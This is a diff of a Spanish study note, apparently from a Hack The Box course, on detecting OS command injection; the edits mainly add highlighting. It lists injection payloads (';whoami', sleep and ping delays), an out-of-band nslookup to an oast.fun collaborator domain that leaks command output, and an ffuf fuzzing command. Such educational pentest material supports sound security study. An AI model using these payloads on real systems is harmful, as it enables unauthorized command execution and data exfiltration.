@@ -10,9 +10,7 @@ Nota previa: "[[00 - Introducción a Command Injection]]"
 Nota siguiente: "[[02 - Operadores de inyección de comandos]]"
 Area: "[[Command Injection.base|Command Injection]]"
 ---
----
-
-En su forma básica, <mark style="background: #ADCCFFA6;">detectar una command injection es indistinguible de explotarla</mark>: se inyecta un operador seguido de un comando y, si la salida cambia respecto a la esperada, está confirmada. Esa definición —la que da HTB— solo describe el caso de laboratorio: entrada directa, sin sanitización y con la salida reflejada en la respuesta. <mark style="background: #FFB8EBA6;">En un objetivo real ese caso es el menos frecuente</mark>. El trabajo de detección consiste en encontrar la inyección cuando **no** ves el output (ciega), cuando un WAF filtra los metacaracteres, o cuando la entrada llega al comando por un camino indirecto. Esta nota sistematiza esa metodología, que HTB da por supuesta.
+En su **forma básica**, <mark style="background: #ADCCFFA6;">detectar una command injection es indistinguible de explotarla</mark>: se inyecta un operador seguido de un comando y, <mark style="background: #FF5582A6;">si la salida cambia respecto a la esperada</mark>, está confirmada. Esa definición —la que da HTB— solo describe el caso de laboratorio: entrada directa, sin sanitización y con la salida reflejada en la respuesta. <mark style="background: #FFB8EBA6;">En un objetivo real ese caso es el menos frecuente</mark>. El trabajo de detección consiste en encontrar la inyección cuando **no** ves el output (ciega), cuando un WAF filtra los metacaracteres, o cuando la entrada llega al comando por un camino indirecto. Esta nota sistematiza esa metodología, que HTB da por supuesta.
 
 # Dónde vive la command injection
 
@@ -39,28 +37,28 @@ Si la entrada no se sanea ni se escapa, inyectamos un [[02 - Operadores de inyec
 127.0.0.1; whoami
 ```
 
-Si la respuesta incluye el resultado de `whoami`, la inyección está confirmada. <mark style="background: #FFB8EBA6;">Un primer sondeo no destructivo</mark> es inyectar solo el operador (un `;` o un `'` suelto) y observar el mensaje de error: un error del intérprete de comandos, una traza o un `500` ya es señal de que nuestra entrada altera la estructura del comando. El detalle de cada operador y su comportamiento se trata en la [[02 - Operadores de inyección de comandos|nota siguiente]].
+Si la respuesta incluye el resultado de `whoami`, la inyección está confirmada. <mark style="background: #FFB8EBA6;">Un primer sondeo no destructivo</mark> es inyectar solo el operador (un `;` o un `'` suelto) y <mark style="background: #ADCCFFA6;">observar el mensaje de error</mark>: <mark style="background: #FF5582A6;">un error del intérprete de comandos, una traza o un `500` ya es señal de que nuestra entrada altera la estructura del comando</mark>. El detalle de cada operador y su comportamiento se trata en la [[02 - Operadores de inyección de comandos|nota siguiente]].
 
 # El caso difícil: blind command injection
 
-Lo habitual en una aplicación moderna: el comando se ejecuta pero su salida **no** vuelve al cliente. Sin output reflejado, la detección directa no sirve y necesitamos un canal lateral. Es exactamente el mismo problema —y la misma solución— que en la [[01 - Introducción a Blind SQL Injection|SQLi ciega]].
+Lo <mark style="background: #ADCCFFA6;">habitual en una aplicación moderna</mark>: el comando se ejecuta pero su salida **no** **vuelve** al cliente. Sin output reflejado, la detección directa no sirve y necesitamos un canal lateral. Es exactamente el mismo problema —y la misma solución— que en la [[01 - Introducción a Blind SQL Injection|SQLi ciega]].
 
 ## Basada en tiempo
 
-Inyectar un comando que tarde un tiempo conocido y medir la latencia de la respuesta:
+<mark style="background: #ADCCFFA6;">Inyectar un comando que tarde un tiempo conocido</mark> y **medir la latencia** de la respuesta:
 
 ```bash
-127.0.0.1; sleep 5          # Linux
-127.0.0.1 & ping -n 5 127.0.0.1   # Windows (ping bloqueante)
-127.0.0.1 & timeout /t 5    # Windows
+127.0.0.1; sleep 5                   # Linux
+127.0.0.1 & ping -n 5 127.0.0.1      # Windows (ping bloqueante)
+127.0.0.1 & timeout /t 5             # Windows
 ```
 
 > [!warning]+ Confirma el retardo, no lo asumas
-> La detección temporal es la más propensa a falsos positivos: la latencia de red, el *rate limiting* y la carga del servidor introducen ruido. <mark style="background: #FFB86CA6;">Repite la medición con varios valores</mark> (`sleep 0`, `sleep 5`, `sleep 10`) y verifica que el retardo escala de forma proporcional antes de afirmar nada. Es el mismo rigor que exige el [[06 - Identificar SQLi basada en tiempo|oráculo temporal en SQLi]].
+> La detección temporal es la más propensa a **falsos positivos**: la latencia de red, el *rate limiting* y la carga del servidor introducen ruido. <mark style="background: #FFB86CA6;">Repite la medición con varios valores</mark> (`sleep 0`, `sleep 5`, `sleep 10`) y <mark style="background: #FF5582A6;">verifica que el retardo escala de forma proporcional antes de afirmar nada</mark>. Es el mismo rigor que exige el [[06 - Identificar SQLi basada en tiempo|oráculo temporal en SQLi]].
 
 ## Out-of-band (OOB)
 
-La técnica más fiable contra una inyección totalmente ciega tras un WAF: forzar al servidor a iniciar una conexión hacia un dominio que controlamos. Si la petición llega, hay ejecución.
+La técnica más fiable contra una inyección totalmente ciega tras un WAF: <mark style="background: #ADCCFFA6;">forzar al servidor a iniciar una conexión hacia un dominio que controlamos</mark>. <mark style="background: #FF5582A6;">Si la petición llega, hay ejecución</mark>.
 
 ```bash
 127.0.0.1; nslookup pentest.oast.fun        # canal DNS
@@ -77,32 +75,32 @@ El salto de calidad: <mark style="background: #8000E1A6;">incrustar la salida de
 El servidor resuelve `www-data.pentest.oast.fun` y nosotros leemos el subdominio en los logs DNS del colaborador. Es el análogo directo de la [[09 - Exfiltración Out-of-Band por DNS|exfiltración OOB por DNS de SQLi]].
 
 > [!info]+ Colaboradores OOB actuales
-> - **`interactsh`** (ProjectDiscovery): self-hosted o público (`oast.fun`, `oast.pro`), con TLS válido. El estándar abierto actual.
+> - **`interactsh`** (ProjectDiscovery): self-hosted o público (`oast.fun`, `oast.pro`), con TLS válido. <mark style="background: #FFB8EBA6;">El estándar abierto actual</mark>.
 > - **Burp Collaborator**: integrado en Burp Pro, cómodo si ya trabajas en Burp.
 > - El comodín OOB cubre el peor escenario (ciego sin tiempo fiable) y deja evidencia limpia para el informe.
 
 # Fuzzing de detección
 
-Cuando no sabes si un parámetro es inyectable, fuzzéalo con una lista de payloads que combinen operadores, comandos de prueba y terminadores, observando cambios en **longitud**, **tiempo** o **errores**. Para blind, la técnica más eficaz es lanzar un payload con `sleep`/`ping` por cada entrada y ordenar por tiempo de respuesta —los hits saltan a la vista:
+<mark style="background: #FF5582A6;">Cuando no sabes si un parámetro es inyectable, fuzzéalo con una lista de payloads</mark> que combinen operadores, comandos de prueba y terminadores, observando cambios en **longitud**, **tiempo** o **errores**. Para *blind*, la técnica más eficaz es lanzar un <mark style="background: #ADCCFFA6;">payload con `sleep`/`ping` por cada entrada y ordenar por tiempo de respuesta</mark> —los hits saltan a la vista:
 
 ```shell-session
 $ ffuf -u "https://target.htb/check?ip=127.0.0.1FUZZ" -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -mt ">4000"
 ```
 
-`SecLists` incluye `command-injection-commix.txt`; `PayloadsAllTheThings` mantiene la colección de referencia con variantes por SO y por filtro.
+`SecLists` incluye `command-injection-commix.txt`; `PayloadsAllTheThings` <mark style="background: #FFB86CA6;">mantiene la colección de referencia con variantes por SO y por filtro</mark>.
 
 # White-box: ir directo al sink
 
-Si tienes acceso al código, la detección es trivial y fiable: busca los *sinks* que invocan la shell (`system`, `exec`, `shell_exec`, `subprocess` con `shell=True`, `Runtime.exec`, `child_process.exec`…) y traza hacia atrás si algún argumento viene de entrada del usuario sin sanear. Es órdenes de magnitud más rápido que el black-box y la base de la [[09 - Prevención de Command Injection|prevención]].
+Si tienes acceso al código, la detección es trivial y fiable: busca los *sinks* que invocan la shell (`system`, `exec`, `shell_exec`, `subprocess` con `shell=True`, `Runtime.exec`, `child_process.exec`…) y <mark style="background: #FFB86CA6;">traza hacia atrás si algún argumento viene de entrada del usuario sin sanear.</mark> Es órdenes de magnitud más rápido que el black-box y la base de la [[09 - Prevención de Command Injection|prevención]].
 
 # Automatización: cuándo
 
-- **`commix`** automatiza la detección **y** la explotación; en modo `--skip-heuristics` o con `--technique` afinado es útil cuando ya sospechas del parámetro.
-- **`nuclei`** con plantillas de command injection sirve para barridos masivos en bug bounty.
-- **Burp Scanner / Caido** detectan inyección durante el *crawling* autenticado.
+- **`commix`** automatiza la detección **y** la explotación; en modo `--skip-heuristics` o con `--technique` afinado es <mark style="background: #ADCCFFA6;">útil cuando ya sospechas del parámetro</mark>.
+- **`nuclei`** con plantillas de command injection <mark style="background: #ADCCFFA6;">sirve para barridos masivos en bug bounty</mark>.
+- **Burp Scanner / Caido** <mark style="background: #ADCCFFA6;">detectan inyección durante el crawling autenticado</mark>.
 
 > [!important]+ La detección manual no es opcional
-> <mark style="background: #8000E1A6;">Las herramientas automáticas fallan en contextos raros</mark> —JSON anidado, doble encoding, inyección de segundo orden, filtros parciales— y generan ruido que dispara WAFs y *rate limits*. Detecta y confirma el contexto a mano; lanza la herramienta afinada solo al punto exacto. El arsenal completo y su uso están en la [[10 - Arsenal de herramientas para Command Injection|última nota]].
+> <mark style="background: #FFB8EBA6;">Las herramientas automáticas fallan en contextos raros</mark> —JSON anidado, doble encoding, inyección de segundo orden, filtros parciales— y <mark style="background: #FF5582A6;">generan ruido que dispara WAFs</mark> y *rate limits*. Detecta y confirma el contexto a mano; <mark style="background: #FFB8EBA6;">lanza la herramienta afinada solo al punto exacto</mark>. El arsenal completo y su uso están en la [[10 - Arsenal de herramientas para Command Injection|última nota]].
 
 > [!info]+ Fuentes
 > - [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection) (detección blind por tiempo y OOB)
